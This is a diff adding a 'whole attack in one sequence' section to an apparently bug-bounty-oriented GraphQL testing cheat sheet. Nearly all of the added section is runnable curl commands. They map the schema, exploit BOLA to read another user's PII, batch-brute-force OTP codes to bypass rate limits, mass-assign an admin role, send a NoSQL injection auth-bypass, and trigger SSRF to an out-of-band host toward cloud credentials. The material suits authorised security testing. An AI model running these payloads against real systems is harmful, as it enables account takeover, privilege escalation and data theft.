@@ -6,6 +6,47 @@
 
 ---
 
+## §0.0 — THE WHOLE ATTACK IN ONE SEQUENCE (copy top-to-bottom)
+> The end-to-end chain in runnable order: **confirm → map schema → BOLA → batch-brute OTP → mass-assign → escalate**. Each block maps to a guide section and to a lettered section below for depth. Fill `G`, `A`/`B` tokens (two accounts you own), ids, and `YOUR.oast.fun`. Wire-level narrative = **guide Appendix D**.
+```bash
+# ── 0. SET ONCE ─────────────────────────────────────────────────────────────
+export G=https://target.com/graphql
+gql(){ curl -s "$G" -H 'Content-Type: application/json' "$@"; }
+A='Authorization: Bearer <A_TOKEN>'; B='Authorization: Bearer <B_TOKEN>'   # two accounts you own
+
+# ── 1. CONFIRM + FINGERPRINT (guide §3) ─────────────────────────────────────
+gql -d '{"query":"{__typename}"}'                 # {"data":{"__typename":"Query"}} = GraphQL
+graphw00f -d -f -t "$G"                            # engine → known quirks
+
+# ── 2. MAP THE SCHEMA (§5 on / §6 off) ──────────────────────────────────────
+gql -d '{"query":"{__schema{queryType{fields{name}} mutationType{fields{name}}}}"}'   # introspection ON: list Q+M
+gql -d '{"query":"{ usr { id } }"}'               # OFF: 'Did you mean "user"?' suggestion leak → then:
+#   clairvoyance -o schema.json -w wordlist.txt "$G"    # rebuild schema from suggestions
+gql -d '{"query":"{__type(name:\"UpdateUserInput\"){inputFields{name}}}"}'   # mass-assign field list
+
+# ── 3. BOLA — two-account, A's token + B's id (§7) ──────────────────────────
+gql -H "$A" -d '{"query":"{ node(id:\"VXNlcjoxMjQ=\"){ ... on User { id email phone role } } }"}'
+#   WIN = B's PII returned to A's session → BOLA. Alias a small range to show scale, then STOP.
+
+# ── 4. BATCHING — bypass the per-request OTP/login limit (§9)  [the headline] ─
+gql -d '{"query":"mutation{ a:verifyOtp(userId:\"7031\",code:\"000000\"){token} b:verifyOtp(userId:\"7031\",code:\"000001\"){token} c:verifyOtp(userId:\"7031\",code:\"000002\"){token} }"}'
+#   Prove: N ops in ONE request where the limit is 1/5 → rate-limit bypass → brute → ATO (measured count = proof).
+
+# ── 5. MASS ASSIGNMENT — self-promote via input object (§12) ─────────────────
+gql -H "$A" -d '{"query":"mutation{ updateUser(input:{ id:ME, role:\"admin\", isAdmin:true }){ id role } }"}'
+#   Read back; if role sticks → priv-esc → admin. REVERT after proof.
+
+# ── 6. ESCALATE — injection / SSRF in args (§11/§16) ────────────────────────
+gql -d '{"query":"query($f:JSON){ user(filter:$f){email} }","variables":{"f":{"$ne":null}}}'          # NoSQLi auth-bypass
+gql -H "$A" -d '{"query":"mutation{ importFromUrl(url:\"http://YOUR.oast.fun/gql\"){id} }"}'           # SSRF OOB → metadata → cloud
+#   → data dump / auth-bypass / cloud creds → RCE.
+
+# ── 7. VALIDATE per sub-bug (§18) → severity by DOWNSTREAM class → PoC → dedup.
+```
+**Order rationale:** map first (everything hangs off the schema) → BOLA/batching are the highest-yield GraphQL-signature bugs → mass-assign/injection/SSRF are the escalators. Lead the report with the highest proven (ATO/RCE/cross-user); bundle introspection/errors as enablers.
+
+---
+
 ## A0. GraphQL basics — read & send a query (newcomers; full primer in guide §2.0)
 ```bash
 # 1) Is it GraphQL? (universal probe)
